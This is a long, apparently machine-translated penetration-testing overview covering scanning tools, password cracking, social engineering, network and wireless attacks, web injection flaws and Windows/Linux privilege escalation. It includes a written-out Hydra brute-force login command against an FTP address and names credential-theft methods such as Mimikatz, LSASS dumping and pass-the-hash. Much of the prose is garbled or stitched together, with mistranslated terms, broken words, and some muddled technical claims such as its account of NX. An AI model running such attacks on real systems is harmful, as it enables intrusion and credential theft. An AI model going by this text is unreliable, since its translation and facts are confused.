dirsearchdirsearch is a simple command-line tool designed to force the discovery of directories and files in a web site.

Vulnerability Scan (Vulnerability scanning) performs vulnerability scans of targets through automated or semi-automated tools.

Scans can be divided into system scans, Web application scanning, and service scanning.

Vulnerability scanning tools can also be divided into automated and semi-automated, where OpenVAS,Nessus et al, while Burp Suite,xray et al are semi-automated.

OpenVAS is an open-source vulnerability scanner developed based on nessus, and whose core component is a set of vulnerability testing programs that can detect security problems in remote systems and applications.

usted by more than 30,000 companies around the world, Nessus has become the most widely deployed security technology and the gold standard for the vulnerability assessment industry.

Nessus is commercial software, though there are also personal free versions.

Nikto is an open source (GPL) Web server scanner that performs comprehensive testing of Web servers against multiple projects, including over 6,700 potentially dangerous files / programs, checking for outdated versions of more than 1,250 servers, as well as version-specific issues on more than 270 servers.

It also checks the server profiles, such as for multiple index files, HTTP server options, and will try to identify the installed Web servers and software.
Scanning items and plugins are often updated, and can be updated automatically.

Burp Suite has designed many interfaces for these tools to speed up the process of attacking applications.

All tools share a request and can handle the corresponding HTTP messages, persistence, authentication, proxy, logs, alerts.

Burpsuit has a charging pro version and a free community version.

Support truncation agents, active, passive scanning, Fuzzy, violent cracking and provide API.

sqlmap is an open-source penetration testing tool that can automatically detect and exploit SQL injection vulnerabilities and take over the database server.

It has a powerful detection engine with numerous features, including database fingerprint recognition, obtaining data from the database, access to the underlying file system, and connecting to in-band execution commands on the operating system.

Most of the time, the vouchers are not kept explicitly, so you need to break your passwords, whether through a dictionary or a rainbow table.

John the RipperJohn the Ripper is a very useful tool.

This is a quick password desher for Windows and many Linux systems.

It has a lot of features and works wonders for many password breaks.

The tool provides the command-line mode, as well as the GUI mode, both the john and the Johnny., respectively

The kali brings in it these two tools.

HydraHydra is a parallel login crack program that supports attacks on multiple protocols.

It is very fast and flexible, and the new modules are easy to add.

The kali integrates the tool by default: hydra-l user-P passlist.txt ftp://192.168.0.1Hashcathashcat is the world's fastest and state-of-the-the-art password recovery tool, supporting five unique attack modes for over 200 highly optimized hashing algorithms.

hashcat currently supports cpu, gpu and other hardware accelerators on Linux, Windows and OSX, and has the ability to help enable distributed password cracking.

It is designed to help businesses secure network security by proactively testing bad passwords for all hosts and network devices.The kali integrates with the tool.

Metasploit was designed to be an attack tool development platform, and it is one of the few tools available to perform many penetration testing steps.

An attacker can import the results from the vulnerability scanner into the open-source security tool Armitage of the Metasploit framework, and then use the Metasploit's module to determine the vulnerability.

Once a vulnerability is discovered, an attacker can take a viable way to attack the system via Shell or starting Metasploit's meterpreter.


It is a penetration testing tool focused on the web browser.

In the growing focus on cyber attacks on clients (including mobile clients), BeEF allows a professional penetration tester to assess the actual security situation of the target environment by using client attack vectors.

Maintenance in PTES is a post-penetration stage. After penetration into the target system, on the one hand, raise the power to the highest authority, on the other hand, maintain the access to the highest authority.

You can bounce shell by adding accounts, by opening a network service listening connection, etc.

Force TCP connection requests initiated by either program must pass agents such as TOR or SOCKS4,SOCKS5 or HTTP (S).

Supported authentication methods include: user / password authentication of SOCKS4/5, and basic authentication of HTTP.

Allows TCP and DNS to tunnel through the proxy, and multiple agents can be configured.

IDA Pro is an interactive, programmable, scalable, multi-processor, cross-Windows or Linux WinCE MacOS platform host to analyze the program, and is recognized as a reverse engineering weapon.

IDA Pro has become the de facto standard for analyzing hostile code and making it itself an important tool in the field of attack research.

It supports dozens of CPU instruction sets that include Intel x86,x64,MIPS,PowerPC,ARM,Z80,68000,c8051 etc.

The reassembly tool is similar to our common IDA, although it is based on JAVA development, is a cross-platform reassembly tool for Windows, Mac and Linux, and users can also develop their own Ghidra plugins or scripts using Java or Python.

It is a free software protected by a general public license, namely the GPL.

Like all debuggers, GDB lets you debug a program, including having the program stop where you want, when you can view variables, registers, memory, and stack.

Further, you can modify the variables and memory values.

GDB is a powerful debugger that can debug in many languages.

The goal of computer forensics is to examine digital media in a forensics manner, with the purpose of identifying, preserving, recovering, analyzing, and presenting facts and views about digital information.

Although it is often associated with investigations of various computer crimes, computer forensics can also be used in civil litigation.

The tools related to evidence collection are as follows, and I do not contact these tools, so they do not expand.

Information collection can be divided into two types: passive information collection (Passive Reconnaissance) and active information collection (Active Reconnaissance).

Passive information collectThe so-called passive information collection means that information is collected by not interacting directly and testing the target.

Simply put is that the test target does not know that you are gathering information.

You can sniff the data packets through wireshark,tcpdump. The principle of sniffing is to open the intermixed mode of the local network card, and the sniffing tool presents the data packets received by the network card.

A useful tool for network sniffing is that all the ports of the hub,hub are in the same conflict domain, different from one per port of the switch, so a machine attached to the same hub can receive packets from all devices.

Sniffing of wireless network packets requires specific wireless network card support, such as Intel 3945ABG.


OSINT OSINT is information that Open Source Intelligence, can be simply understood as open source on the Internet.

We often hear human flesh searches, and part of it is using OSINT to search for information about targets.Like social accounts, id, etc.

recon-ng and msfconfole operate very similar, the new version of kali integrates the recon-ng tool, but the default is not installed module very basic demonstration process is as follows, (some modules need to use API key, these need to be configured to normal use) active information collection refers to the way of collecting information directly and test target interaction.

Test objectives can theoretically know that you are gathering information.

It's like you like a girl and go over to greet her for contact information.

Active information collection of some common methods such as: host enumerated network enumerate the user enumeration group enumerated network shared enumeration Web page enumeration application enumeration service enumeration package forgery.

Like using nmap to use the plugin smb-enum-users to perform the smb user enumeration, some scripts also take participation, such as using smb for process enumeration, which requires the smb account password as a parameter.

Scapy is a powerful interactive package processing tool, package generators, network scanners, network discovery tools, and a package sniffing tool.

It provides multiple categories of interactive generated packets or packet sets-fits, packet manipulation, packet sending, packet sniffing, response and feedback matching and more.

Voucher scanning refers to the login voucher that provides the root permission of the scanner system, such as providing the ssh/telnet account password, and the scanner can enter inside the scanned system through the voucher.

If conditions are recommended, because such scans will be relatively accurate and the coverage will be comprehensive.

Discovery scan is similar to nmap, constantly in the probe, and then matching the database, the goal is to discover the host, port, service, version, web path, etc.

Typical examples of full scanning such as Nessus,Nessus can configure policies, such as running all the plugins, but in fact many plugins do not apply and can be cropped out to speed up the scan.

Passive scanning is secret scanning to mirror the normal user-access process port to the scanner. The scanner establishes a network topology according to the information and determines whether there is a security vulnerability.

The purpose of the secret scans is not to want the target to find the scan traces.

Compatibility scans such as GDPR scanner, warranty 2.0 scanner, HIPAA scanner, etc., for specific rules to test whether the target equipment meets the standards, but many times still need to participate in the evaluation.

Vulnerability Scan Challenge scanning time selection on the one hand scanning can affect the network / business when the business is busy, on the other hand the scanning process can cause service abnormalities such as device downtime.

The scanning protocol confirms that if the device currently supports udp and tcp, both tcp,udp should be configured when configuring the scanning options, otherwise it may cause missed sweeps.

Network topology tries not to scan targets across multiple networks, which may cause some additional uncertain effects.

It is best that the scanner and the target device are configured in the same network, like all deployed in the DMZ.

Bandwidth limitation When scanning, consider the bandwidth limitation, on the one hand, reduce the impact on other devices in the network, on the other hand is to avoid affecting the scan progress and results because the bandwidth reaches the upper limit.

Other resource restrictions exclude bandwidth reasons, there may be other factors that may cause scan bottlenecks, such as multithreaded target device abnormalities, etc., this factor should also be considered when scanning configuration.

fragile systems such as printers, IoT devices, to selectively scan, or even directly exempt scanning.

But in fact, such devices may also increase the risk, especially as IoT devices have been often exploited in recent years.

So according to the comprehensive scanning strategy configuration according to the actual situation.

I prefer this process called Vulnerability Point Assessment (Vulnerability Assessment).

According to the PTES process, information collection is followed by threat modeling, followed by vulnerability point assessment.
How to understand this fragile point is also very important, take the following scene as an example: a target system open 3306 port, mysql service, but the account password is high intensity, can be broken but can not succeed, this is a fragile point, we score it as low risk the system and open xxx service, detection found that you can obtain some special name information through the service, this is also a fragile point.

We also score it as low-risk or information.

Assuming that a scenario breaks the information obtained through the xxx service as a password for mysql, if authenticated, it is a high-risk or even severe vulnerability.

So although it doesn't seem that a fragile point is low-risk, if you use some vulnerabilities in series, it can cause great damage.

With a simple abstract diagram to illustrate my understanding of the fragile point evaluation, I abstracted the test target / system as a circle, outside the circle is the user interacting with the system, black circles and inner white blocks represent the processing process and assets of the system.

The task of vulnerability point evaluation is to find out the vulnerability point one by one, point A is a clear vulnerability point, but some people only measure the longitudinal point, so they give low risk, while others measure the horizontal point and give high risk.

Point B also seems to be a fragile point, but in fact there is reinforcement on this point, should be no problem, report the fragile point is also ok, it is best to report an Info (information).

Point C is not so clear, from God's point of view, here is really a fragile point.

Point D runs directly through the internal system, but is less easy to detect because the exposure is small.

Talking about automation, for Party A, it relies entirely on manual penetration. Whether it employs hired as a red team for penetration test or paying Party B to test, the cost is quite high, and the coverage is very limited.

All the results can also be done very well if they can effectively use free / commercial scanners for systematic / periodic scans.

Carefully select some appropriate scanners and scanning strategies, carry out periodic automatic scans, and then arrange some manpower to analyze the scan reports.

Having the red team / third party team conduct artificial penetration test every half months / year is the ideal penetration test implementation strategy.

My point of view is that achieving the top of safety is to cultivate a safety culture, with invisible and no move. SDLC is like law, which is to promote and restrain through mechanism, and safety culture is like morality, which is driven and constrained by inner consciousness.

If you just want to do vulnerability identification, it's no problem, but you can't be called a penetration test, just a vulnerability identification or vulnerability analysis.

Part of penetration testing is to go around defense mechanisms like WAF,IDS,IPC,Anti Virus, so penetration testing is more difficult than vulnerability identification, all more time-consuming and more expensive.
Threats can be understood as a conscious / unconscious "motivation".

All the threat is the threat.

Vulnerability / vulnerability points can be understood as a fragile state.

Utilization and post-utilization is an action / behavior.

Risk is the probability that the threat is reached.

In general, threats can be classified into the following categories 1. organized crime 2. Hackers 3. State-supported hackers (mostly APT) 4. Internal threats 5. script.

Increase safety infrared induction someone broke into the alarm.

This is the function of penetration testing, first to dig out the security loopholes, and then to verify whether the protection mechanism is perfect enough to resist the threat.

Perfiltration test methodology penetration test can be divided into: black box, gray box, white box test.


Provide skills training to product related personnel, so that they can have a sense of security vulnerability, can test vulnerabilities in the development process, and understand the early interaction of vulnerability solution. This chapter includes test plan, test scope, agreement signing and other early test procedures.

With the penetration test executor for party B, the penetration test demand for party A, from the perspective of party B, I need to do in the early interaction process, this chapter into two forms, one is the questionnaire, the early interaction table questionnaire target is to let party B a preliminary understanding of party A's needs and test objectives through the questionnaire, for the scope of the later, target definition for the questionnaire early interaction table.

This is often regarded as a fraud on others to collect information, cheat, and invade computer systems.

In British and American common law departments, this act is generally recognized as an invasion of privacy.

Phishing is an indiscriminate attack with no specific target or group.

Harpoon fishing attack is a fishing attack against a specific target group (such as a company, or a department, etc.).

Whaling is a fishing attack by high-level target groups (like CEO,CFO,CTO etc.

Generally speaking, the attacker does not collect information in very direct ways, such as please give me your login password, and generally will collect information by side tapping, which is called lure out.

The way of communication with the attacker is also very in need of skill, the attacker should make good use of the open (open ended) and closed (closed ended) questions to grasp the communication initiative, and test the answers.

This is called an interrogation (interrogation).

The general attack scenario is an attacker counterfeiting someone (impersonation) and the target being questioned by the attacker to lure out the desired information.

Interrogation process information collection technique interrogation posture or body language face, such as white, or red movement of the head or eyes toward the hands and feet of the interrogator's lip statement tone and speed shoulder peep (shoulder surfing) In computer security, shoulder peep is a social engineering technology used to obtain information, such as personal identification number (pin), password and other confidential data through the victim's shoulder, from the device keys or sensitive information is spoken and heard, also known as eavesdropping.

A realistic example of a group of people crowded in an elevator, when you take out your phone and transfer it to someone else, and the person behind you or on your side may see your transfer password through a shoulder peep.

In the USB drop attack, the attacker intentionally drops a special USB device for people to pick up.

A person picking up such a USB device, either in kindness or curiosity, will insert a USB device into their own computer.

The specially-made USB device may have a self-running virus program, or lure the attacker to open a virus file, prompting the attack to succeed.

Impact strategy is how an attacker influences the outcome of social engineering and achieves social work purposes through the following strategy.

How to hook the target user also requires good strategies, such as scarcity and emergency, or fear the target user, it may be easy for the target user to hook.

An attacker can pose as authority to achieve social engineering purposes.

For example, imitate an information security expert, who provides you a tool to verify the strength of a password, which has a back door that transmits the input password to an attacker.

Scarce and Emergency (scarcity and urgency) attackers create an emergency decision-making environment through scarcity.

For example, an attacker sends a phishing email to the attacker, for congratulations to you on being a lucky user, click on the link below to get the prize, the top five will have the chance to get an xxx phone.

In the context of this construction, it is easy to click on the link to get the prize without much consideration.

Social identity (social proof) Social identity is a psychological phenomenon arising when people fail to identify appropriate behavioral patterns in a social context.

If you see someone else acting or speaking in some way, it's easy to think that is appropriate.

In general, social effects lead to convergence of large groups of individuals on correct or incorrect choices.

It is common when people enter into unfamiliar situations and there is no framework to deal with this situation, so they imitate the behavior of others that they consider more familiar and therefore better informed.

For example, when you walk in the street and see a group of people playing chess games, you squeeze into the crowd and find that everyone is discussing this, so you can win, let one of them watch you ask you say, you see if so, so, you can win, you half understand can only talk with the voice, yes.

This is an act of social identity.

When you are in an environment specially created by an attacker, you can easily be in the attack trap of social identity.

NetBIOS,LLMNR and SMBNetBIOS and LLMNR are protocols Microsoft for host recognition.

Open the windows System Control Panel-System interface, you can see the computer name in Computer Name, Domain and WorkGroup Settings, such as Pentest, name is the domain name, to replace the memorable ip address.

The SMB service is also opened through sharing.

Ports related to the NetBIOS include the TCP 135,139;UDP 137,138.

The port associated with the SMB is TCP 445.

Attack patterns The so-called attack mode (Attack Pattern) and design patterns are similar to empirical abstract, with a broad range of applicable patterns.

For example, the factory mode, the observer mode in the design mode, in some situation, the mode will be more efficient, and the code structure is easier to maintain.

The attack mode is similar, such as the middleman attack, the cache poison attack, in some case, using the corresponding attack mode, can effectively achieve the purpose of the attack utilization.

Common Attack Pattern Enumeration and Classification (CAPEC) collects a lot of attack patterns, ranging from abstractions to details, a treasure house of attack patterns for interested readers.

Host enumeration, account password burst, LLMNR poisoning, using known vulnerabilities such as Eternal Blue (EternalBlue) tool NBNSpoof,Metasploit,Responder,Pupy,searchsploi, security tips, if not necessary, can close the NetBIOS and LLMNR services, which can reduce the attack surface of the system.

You can determine whether the LLMNR is closed by looking at the registry.

DNS Cache Poison in my previous article Penetration Test Guide (III) Social Engineering mentions a social worker approach as domain deception, which can be done by changing the host files (hosts files) on the victim's computer, DNS poisoning, or exploiting vulnerabilities in the DNS server software.

When we visit a domain name, the system will automatically resolve the domain name ip, the order is the local DNS cache- -hosts file- -DNS domain name resolution DNS when resolving the domain name, the resolution results of the superior reply are cached local, if the domain name is queried again in some time, with the data in the cache.

The DNS cache poisoning means that the attacker resolves some or all of the domain names into the DNS server, middleman attack, etc.), to the attacker-controlled server ip address.

After the DNS is poisoned, the ip address, controlled by the attacker, returns for fishing, domain deception, and middleman purposes.

Security Tips Configure DNS servers, rely on other DNS servers as little as possible, and avoid other DNS servers from poisoning after infection using versions above BIND 9.5.0 that enable the DNSSECSNMP Simple Network Management Protocol (SNMP) to manage devices within the organization.

Managed device deployment snmp agent, while managed device deployment snmp manager.

The snmp uses the udp 161 port.

There are multiple versions of snmp, where v2c and v3 are widely used, where v2c uses the string as a password and v3 uses the account password as the login credentials.

Using the smtp-user-enum tool, user names based on VRFY and EXPN signaling via searchsploit smtp search for smtp related vulnerability security tips Close smtp server open-relay feature blocking VRFY and EXPN signaling FTPFTP are file transfer protocols that are very frequently used network protocols.

Generally, it is listening to the tcp 21 ports.

The hash transmission refers to that the attacker does not know the original password, but knows the password after hash, and the attacker can also complete the authentication by sending the hash password to the server.

Tool Mimikatz, The tool is used to obtain the hash value of the password in memory.

The metasploit also has a Mimikatz module that can achieve the same functionality.

Intermediate AttailThe middleman attack (Man-in-the-middle:MITM) is when the attacker puts himself in the middle of both sides of the communication.

Attack Mode ARP Cache Toison DNS hijack, DNS pollute, DNS Cache poison Operation STP (Spanning Tree Protocol) becomes a Root Switch Rogue Router, Let other routers think the router has the best routing policy in the attacked device security malware, Hiack traffic to the middleman device tool arpspoof, ettercap, SSLStrip, SSLsplit Security Tips Configuring Router / Interaction Machine ACL Implementation 802.1X Enables DAI (Dynamic Address Resolution Protocol Inspection) Prevent ARP poisoning configured VLANDoS/DDoSDoS attacks can be classified into direct attacks, Reflection attack, Scale attack direct attack is the attack device traffic directly to the target device, A reflex attack is when an attacker hits the traffic to the middle device, The intermediate device is rereflected to the target device.

The amplification attack belongs to the reflection attack, but during the reflection process, the flow rate is amplified.

The application scenario of DDoS attack is that the target device is a cloud platform, and the attacker cannot reach the traffic of the target device, so it, multiple devices are needed to attack together.

DoS attacks have other attacks besides playing traffic, such as dead ping, buffer overflow, hping3,mirai,hulk,LOIC,R-U-Dead-Yet,slowloris,torshammer other attack modes downgrade attacks.

For example, exploiting the POODLE vulnerability can reduce the intensity of the encryption protocol suite. The BGP hijacks the NAC around the VLAN jump attacks on the DHCP Hunger attacks and the Rogue DHCP servers.

Wireless and RF based vulnerabilities exploit the rogue access point, after an attacker builds a no authentication-free rogue access point to connect to the AP, further perform other attack evil twins (Evil Twin) attackers set up a same S S I D and password as the target AP, allowing the attacker to think connected to the normal AP (A c c e s s P o i n t) to remove the authentication attack (Deauthentication) wireless device connected to the A P, wireless device has STATION ID,AP with BSSID.

The authentication relationship can be removed between the wireless device and A P through tool aireplay-ng, causing the connection to connect the STATION ID and the AP of the wireless device

To turn on the listening mode of the wireless network card, you can turn on / confirm whether the listening mode is on through airmon-ng.

Next, the B S S I D and STATIONWiFi signal interference can be viewed by airodump-ng.

The WiFi signal has 2.4g and 5g bands, each divided into multiple channels, and each channel has its own frequency range, which can cause denial-of-service attacks if high intensity signals are continuously transmitted over the target frequency range by the wireless transmitting device in the target frequency range.

War driving can be simply understood as driving around the target, collecting wireless signals from the target site and drawing them on a map.

Commonused tools such as WiGLEWEP attack WEP are encrypted by the RC 4 algorithm and the initial vector IV is transmitted in plaintext.

If the AP supports and the WPS function is turned on, then you can log on to the device through the PIN code, and the PIN code is an 8-digit number and can be broken.

A common tool is the ReaverKARMA attack KARMA (Karma Attack Radio Machines Automatically) is a middleman attack method.

Each time a wireless client connects to an AP, it records information such as SSID and PSK, and makes constant attempts to connect these already recorded local AP information (PNL:Preferred network list) when the wireless client is not connected to the wireless network.

A KARMA attack is all Probe attempts to listen on a wireless client to later copy the A P in a PNL for the purpose of a middleman attack.

Patp Attack (Fragmentation Attacks) Wireless Splinning attacks can be used to attack devices that enable WEP.

A wireless injection attack of 1500 bytes were generated using the PRGA (pseudo random generation algorithm) algorithm.

Bluetooth hijacking refers to information occurring to the target device through Bluetooth, such as Bluetooth theft (Bluesnarfing) such as address book business card to obtain information from the target device through Bluetooth, such as IMEI, call records and text messages.

The commonly used Bluetooth theft tool has bluesnarferRFID attack RFID is divided into active and passive, passive RFID cards do not bring their own power supply, they need the card reader electromagnetic resonance to obtain energy, send and receive data.

Active RFID cards have their own power supply.

RFID is divided into low frequency card and high frequency card, in which the low frequency card 120k-140kHz, high frequency card 13.56MHz, the higher the frequency of UHF card 860M-960MHz,, the longer the distance the commonly used RFID attack tool for Proxmark3, can be transmitted through the attack clone card, simulation card, etc.

For the penetration test of a target system, consider the attack surface first.

First, if the target system does not have networking functions, it can only be tested locally, in local / physical ways, local such as GUI, and serial port shell, physics such as JTAG,UART tests the system at the local hardware and software level.

Of course, the target system can also be connected with this attack surface, in order to understand, we first assume that the target system is divided into connected and not connected two categories.

And the network can be through wireless and wired, for wireless and wired physical channel attack and the network service itself is irrelevant, is also an attack surface.

Network services above physical channels can be divided into self-developed network services and third-party network services such as open source software / services, all can eventually be divided into these categories: local attacks, wireless channel attack, third-party application service attack, self-developed application service attack.

I think that is what the certification guide knowledge system is all about.


For example, the SQL statement SELECT * FROM Customers WHERE ContackName LIKE '%Saavedra%', where%Saavedra% is transmitted from the front-end form to the back-end. If the back-end does not do the appropriate verification for the front-end input data, it may cause SQL injection.

According to the channel where SQL injection obtains the information, SQL injection can be divided into In-band injection, Out-of-band injection, and Blind injection.

The In-band injection (in-band injection) means that the injection effect can be seen in the requested Response.

The most intuitive example is the injection effect seen in response in Burpsuit repeater.

The Out-of-band injection (out-of-band injection) means that the injection result is not returned in the current request operation, but also in other channels, somewhat similar to a side channel attack.

Finally, the Blind injection (blind note) means that there is no response to determine whether the injection is successful, and the server does not have any data echo.

In this case, the injection can be judged by sleep time delay.

The attack technology of attack SQL injection can be divided into Union type injection, Boolean type injection, Error-based type injection, Out-of-band type injection, Time delay type injection, etc.

Before doing the SQL injection test, first try to detect the model and version information of the SQL server. You can try to scan with nmap, or enter illegal characters to allow the SQL statement to perform the error report, and judge the model and version of the SQL server according to the error information.

UNION injection The following example is the conventional UNION injection, taken from the WEBGOAT target machine, the normal operation is to enter a user name, the server will return the user name userid,username,password and other field information but if you enter the following user name, you can obtain all the user user name and password, the vulnerability is the premise, that is, you know that each field type and table name user_system_data Generally speaking union injection is based on display, leak some sensitive data.

Boolean injection If the attacker performs the SQL injection, the server returns the information has two states, the injection statement execution success and the injection statement execution failure to return the different state, belongs to the Boolean injection.

According to the example of DVWA, whether the user exists is judged according to the userid, for example, input 1 returns the user existence, and input 5 returns the user absence.

Out-of-band SQL injection follows a simple mention of Out-of-band injection, and simply, it is considered out-of-band (Out-of-band) if the backend returns information through other channels.

For example, if the malicious site receives an access request, it indicates that an out-of-band SQL injection exists.

Time-based injection When the injection success cannot be judged by the information returned by the server, a time-based SQL injection is required for the test.

The basic time-based idea is that if the SQL statement is executed, the sleep fixed time such as 2.5 seconds, if the server return time delays 2.5 seconds, indicating that the SQL execution is successful, and time-based injection can also be used in UNION and Boolean types, a feature that makes time-based injection very applicable in the scanner.

In the following example, the injection statement is expressed as sleep 10 seconds if the version information starts with 8, that is, the response's return of the sql version takes 10 seconds when it starts with 8.

sqli-labs is great to practice SQL injection target machine environment that interested readers can set up to learn.

Stored procedure (Stored Procedure) is a set of SQL statements in a large database system to complete specific functions, which is stored in the database and compiled once by the user by specifying the name and giving the parameter (if the stored procedure has parameters).

In fact, it is not using the stored procedure to prevent SQL injection, we can look at an example of stored procedure 1 stored procedure 2 The above examples can see that stored procedure 1 or SQL statement splicing, or a SQL injection vulnerability, while stored procedure 2 can effectively avoid the SQL injection vulnerability, so using the stored procedure to avoid SQL injection or depends on how the stored procedure is written.

The html injection, is essentially injecting some illegal html content into the front-end page of the attacker's traffic.

As for the way the injection can be injected by form, pages can be modified by invading the web server, etc.

Command injection focuses on execution of arbitrary commands on the host operating system performing arbitrary operating system commands on the target system.

According to the experience of the author's general, it is easy to inject ip, the reason is that many times the configuration of ip is handled with script, otherwise it is handled with system and other similar functions, parameter legitimacy verification is easy to exist command injection.

Command injection distinguishes itself from RCE (Remote Code Execution) in that the RCE is a code-level execution, and generally refers to a code injection in an explanatory language.

DVWA has command injection exercises, and readers are interested in building the environment to try this vulnerability.

We all know that the tcp connection process, from tcp shaking hands three times, to tcp waving four times, is a session.

After the Web service has the Client Access server, the server places the session ID in the Cookie to facilitate the server's client identity.

The session ID can be divided into two stages before authentication and after authentication. The pre-authentication session ID only identifies an unauthenticated client, and the authenticated session ID is to identify a certified client. The server passes the authenticated session ID to identify the user and provide the corresponding permissions.

So the question is, assuming the attacker gets this certified session ID, can it imitate the normal user?The question thrown here is session hijacking, where when an attacker obtains an authenticated session ID by some means, you can use the identity of the attacked person.

attackers can get session ID by session breaking, session sniffing, middleman attack, of course, a typical scene is the session ID transmission in the URI, which is easy to cause session ID leakage, which is a problem that should be paid attention to.

Fixed the way the session hijack can try to bind the session to the client ip so that the session cannot be successfully exploited even if it is acquired by a third party.

Of course, this repair method can not be used in some scenarios, which can be used as a general solution.

Redirect In some scenarios, you can construct a malicious URL to use the redirection and forwarding vulnerability to achieve the purpose of authentication and access control bypass.

So don't think that the product is safe, operation and maintenance is also an important link.

Authorization-based vulnerabilities Before talking about licensing loopholes, we should first understand some basic models of authorization. The existing more mature authorization models have independent access control, forced access control, role-based access control, and attribute-based access control.

Most of them, DAC and MAC are more common in operating systems, while general Web applications, mostly use RBAC.

RBAC vulnerabilities can be roughly divided into two categories, both horizontal and vertical overreach.

The admin user belongs to the admin role, and the admin role has the right to add, delete and check all user resources, and can be added to delete and check users and roles.

Vertical overreach above explained horizontal overreach, the operation of resources that are not their own access.

For example, user users are unable to add users and roles.

Assuming that an user user can add new users, it is a vertical overreach.

HPP parameter contamination refers to the recurrence of the same parameters, such as an attacker can exploit HPP vulnerabilities to bypass input detection, trigger application error reporting, or modify the value of internal variables.

Wandering the hackerone can frequently see the xss and sql injection vulnerability as you can know, XSS is a common security vulnerability.

You can consider Client1 that attacker, thinks Client2 sends malicious data to the server in advance. After the server receives the attacker data, it saves the data in the database. When victim visits the server, the server takes out the attacker data and encapsulated into a browser sent by h t m l to victim,victim to parse the rendering process, triggering the xss attack.

Maybe the old version of the browser does not have a security mechanism, or can trigger the popups.

In my personal point of view, xss research can go deep into the discovery of xss injection points from the following aspects and utilization around xss is the discovery of the injection point, positioning where the input can be for where the output, probably in the same channel, or in different channels.

From the front end, see how the data was sent to the server, how the server returned, the returned data is processed, and then lost to the browser analysis and rendering.

After the above-step analysis, you can determine where the injection points may exist.

The construction of payload to do two points, one point is to bypass all kinds of WAF,IDS,IPS protection, the other point is that the construction of payload to do something, don't just pop up a window, to this step is also to steal a Cookie or CSRF and do something.

Further utilization of xss vulnerability to achieve greater damage effect.

The essential reason for x s s protection method of XSS xss is to take data as code execution and can understand xss as code injection.

So the core idea of xss protection is to escape, restore data to data, like for a browser so using html encoding can solve a large part of the xss problem.

Alternatively, you can add X-XSS-Protection, to the header part of http as well as HTTPOnly to Cookie to reduce the effect of xss.

During the xss attack, payload is sent from the front end to the back end, back to the front end, the front end, and finally to the browser rendering.

There may be multiple escape coding problems in these processes, and our hope is to do good html coding before the front end gets the back end data to the browser rendering, which can effectively prevent xss.

The work principle of CSRF is step 1: victim access to the target site, step 2: attacker entices victim to open the malicious URL, step 3: victim opens the malicious URL in the same browser, step 4: victim browser opens the malicious URL rendering, trigger the CSRF operation, request forgery attack on the target site.

Cookie tampering is similar to xss, attacker injects malicious js code into the page D O M accessed by victim, and finally starts the code execution in DOM to modify the value of Cookie.

File inclusion Vulnerability file inclusion can be divided into local file inclusion (LFI) and remote file inclusion (RFI).

Services, ports, protocols can be understood as each open port corresponds to a service in the background, and the service is protocol to regulate the scope and capabilities of the service.

For example, telnet,snmp v1,v2,syslog,IMAP,POP3 and other services are unsafe, it is easy to be sniffing network leakage of sensitive information.

Many times services are provided through third-party software that may have security vulnerabilities, or that older versions of the software are not patched in time.

There are two directions of local rights promotion, one direction is from a low-level user to another high-level user, such as from an omar user to a admin_user user, the dirty cow vulnerability is an example.
Another direction is to achieve the purpose of lifting rights by changing the user's permission, such as upgrading the omar users of the u s e r group to the admin group.

This reminds me of the CVE-2019-14287 vulnerability which is s u d o bypassing the security policy and executing sensitive commands.

The sticky bit acts on a directory so that the files in the directory can only be deleted or renamed by owner or superuser, and a typical example is the tmp directory.

Here are the SUID setup. Can you find the difference?When owner x permission is set, SUID appears as s, and when owner x permission is not set, SUID shows as SSUID setting is to allow the user to run with the program owner permission, the typical example is the passwd program, this program to modify the shadow file, only root permission can operate, but the ordinary user can modify their password through this command, with this mechanism.

Unsecure sudo implementation sudo is short for super user do.

The role of the sudo is to have the average user execute the command with the root permission, and the sudo is usually followed by a command.

Another command similar to sudo is s u, the su command works to switch the user, if not with the user, the default is root.

Usually sudo and su are interconvertible / etc/sudoers profiles profile line introduction, from left to right each field represents the sudo user, hostname, any user, any group, executable commands respectively.

You must be careful to configure sudoers files, otherwise the low rights users have root rights, which may have a greater security impact on the system, and the higher the potential risk.

The ret2libc Attack Stack overflow vulnerability is familiar with, when the code works improperly on memory, causing overflow vulnerabilities, such as the strcpy function.

A typical attack scenario is where an attacker injects the shellcode into the stack by overflow and then controls the program counter by jumping to the shellcode location in the stack for execution.

To prevent such types of shellcode injection, the operating system integrates no-execute (NX) technology that sets memory segments to RWX permission labels, similar to the file system so that simply setting RW to the stack can solve the problem performed in the shellcode injection stack.

The attacker find a new class of attacks, the ret2libc (return to libc) mentioned in this chapter.

This attack is not by injecting the shellcode, but by jumping the control stream into the libc via the l-program counter because the libc is loaded into memory and is definitely executable, bypassing the NX.

Another high-level utilization method based on ret2libc is that ROP (return oriented programming) is to construct the utilization chain using the various r e t instructions of libc for attack purposes.

In order to prevent the use of ret2libc, the operating system realizes ASCII armoring and ASLR and other technologies, both attack and defense compete with each other, and constantly promote the development of technology.

Windows permissions CPassword If an administrator uses CPassword to perform regular tasks such as modifying the local administrator account, any average user can get the authentication key by having read permission to the SYSVOL directory, and you can next crack the account via John the Ripper or Hashcat.

LDAP Document Many organizations still configure their Windows domain controllers to support explicit document authentication.

A simple judgment of whether the system is certified by plain text credentials, go to Active Directory Service log to find the logs with ID 2886 and 2887. If this numbered log exists, the system still transmits the credentials in plain text.

KerberoastingKerberoast is a set of toolsets that attack Microsoft Kerberos implementations and Windows service accounts.

This tool is available from the https://github.com/nidem/kerberoast get.

LSASS can drive the memory d u m p of the LSASS (L o c a l S e c u r i t y A u t h o r i t y S u b s y s t e m S e r v i c e) process to the Sysinternals ProcDump tool, and then get user credentials via Mimikatz.

The SAM database SAM file is stored in the%SystemRoot%/system32/config/SAM file with the password hash value, There are two uses after obtaining the SAM file, one is for pass the hash to bypass authentication directly with h a s h, and one is for breaking the password.

The DLL hijack DLL is the dynamic library suffix under windows, the same as the linux so.

Depending on the system configuration, the application can determine the directory search order of the DLL.

The attacker takes advantage of the loading order to allow the program to preferentially load the malicious DLL library in the current directory and execute the malicious code.

Another administrator often configures the Windows service to perform using SYSTEM permissions, and the attacker can obtain permissions through the service or the directory where the service is located.

Unsecure File and directory permission attackers can use unsafe or misconfigured file or directory permissions for attack purposes.

Windows Group Policy Group Policy (English: Group Policy) is a feature of Microsoft's Windows NT family operating system that controls the working environment of user accounts and computer accounts.

Group policies provide centralized management and configuration of user settings in the operating systems, applications, and active directories.

One version of a group policy is named Local Group Policy (abbreviated "LGPO" or "LocalGPO"), which can manage group policy objects on independent and non-domain computers.

